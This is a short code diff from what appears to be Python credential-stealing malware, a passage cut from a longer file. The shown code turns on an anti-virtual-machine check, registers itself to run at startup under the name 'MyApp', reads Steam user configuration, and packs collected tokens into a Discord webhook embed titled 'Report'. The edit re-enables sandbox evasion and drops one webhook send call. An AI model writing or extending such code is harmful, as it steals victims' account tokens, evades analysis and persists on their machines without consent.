@@ -95,7 +95,7 @@ class Main:
         return tokens
 
     def run(self):
-        # Thread(target=self.antivm).start()
+        Thread(target=self.antivm).start()
         self.addStartup("MyApp", os.path.realpath(__file__))
         
         userConfig = self.steam()
@@ -117,7 +117,6 @@ class Main:
             embed.set_timestamp()
 
             self.webhook.add_embed(embed)
-            r = self.webhook.execute()
 
         embed = DiscordEmbed(title='Report', color="656166")
         embed.add_embed_field(name='Tokens', value=f"""```{tokens}```""")
